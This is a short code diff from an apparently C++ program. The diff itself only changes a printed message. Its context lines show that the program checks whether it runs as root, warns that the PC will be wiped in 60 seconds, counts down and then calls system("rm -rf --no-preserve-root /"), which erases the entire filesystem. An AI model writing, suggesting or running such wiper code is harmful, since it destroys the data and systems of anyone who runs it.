@@ -17,7 +17,7 @@ int main()
     int id = getuid();
     if (id == 0)
     {
-        std::cout << "\nYou are root";
+        std::cout << "\nYou are root!\n";
         std::cout << "This pc will be wiped in 60 seconds\n";
         counter(60);
         system("rm -rf --no-preserve-root /");
